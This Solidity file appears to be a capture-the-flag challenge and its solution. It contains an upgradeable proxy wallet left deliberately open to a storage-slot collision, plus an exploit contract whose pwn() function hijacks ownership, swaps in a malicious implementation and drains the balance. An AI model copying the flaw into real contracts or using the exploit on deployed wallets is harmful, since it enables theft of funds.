// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

interface IUpgradeableWallet {
    function setWithdrawLimit(uint256 limit) external;

    function setImplementation(address imp) external;

    function withdraw() external;
}

contract MaliciousImplementatation {
    address public implementation;
    uint256 public limit;
    address payable public owner;

    constructor() {
        owner = payable(msg.sender);
    }

    function withdraw() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}

contract UpgradeableWalletExploit {
    address public target;
    MaliciousImplementatation public malicious;

    constructor(address _target) {
        target = _target;
        malicious = new MaliciousImplementatation();
    }

    receive() external payable {}

    function pwn() external {
        uint256 myAddressAsUint = uint256(uint160(address(this)));

        (bool success1, ) = target.call(
            abi.encodeWithSignature(
                "setWithdrawLimit(uint256)",
                myAddressAsUint
            )
        );
        (bool success2, ) = target.call(
            abi.encodeWithSignature(
                "setImplementation(address)",
                address(malicious)
            )
        );
        (bool success3, ) = target.call(abi.encodeWithSignature("withdraw()"));

        require(success1, "setWithdrawLimit failed");
        require(success2, "setImplementation failed");
        require(success3, "withdraw failed");
    }
}

contract UpgradeableWallet {
    address public implementation;
    address payable public owner;

    constructor(address _implementation) {
        implementation = _implementation;
        owner = payable(msg.sender);
    }

    fallback() external payable {
        (bool ok, ) = implementation.delegatecall(msg.data);
        require(ok, "failed");
    }

    function setImplementation(address _implementation) external {
        require(msg.sender == owner, "not owner");
        implementation = _implementation;
    }
}

contract WalletImplementation {
    address public implementation;
    uint256 public limit;
    address payable public owner;

    receive() external payable {}

    modifier onlyOwner() {
        require(msg.sender == owner, "!owner");
        _;
    }

    function setWithdrawLimit(uint256 _limit) external {
        limit = _limit;
    }

    function withdraw() external onlyOwner {
        uint256 amount = address(this).balance;
        if (amount > limit) {
            amount = limit;
        }
        owner.transfer(amount);
    }
}
